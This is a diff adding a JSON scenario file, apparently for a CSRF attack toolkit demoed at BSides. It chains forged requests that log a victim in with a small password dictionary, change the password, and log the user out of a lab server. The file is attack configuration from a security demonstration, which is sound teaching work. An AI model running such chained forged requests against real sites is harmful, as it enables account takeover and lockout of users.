@@ -1,0 +1,39 @@
+{
+    "audit": {
+        "name": "BSides | Login the user, change his password and log him out (Transparent Attack) Demo 1/2",
+
+        "scenario": [
+            {
+                "attack": [
+                    {
+                        "method": "POST",
+                        "type_attack": "dico",
+                        "file": "C:\\Perso\\git\\CSRFT\\dicos\\passwords.txt",
+                        "form": "C:\\Perso\\git\\CSRFT\\exploits\\bsides_form_log_user.html",
+                        "comment": "attempt to connect the user with a list of selected passwords (top 20)"
+                    }
+                ]
+            },
+            {
+                "attack": [
+                    {
+                        "method": "POST",
+                        "type_attack": "special_value",
+                        "form": "C:\\Perso\\git\\CSRFT\\exploits\\bsides_form_change_password.html",
+                        "comment": "Then, we change his password"
+                    }
+                ]
+            },          
+            {
+                "attack": [
+                    {
+                        "method": "GET",
+                        "type_attack": "special_value",
+                        "url": "http://192.168.1.57:8081/logout",
+                        "comment": "The final step is to log the user out"
+                    }
+                ] 
+            }   
+        ]
+    }
+}
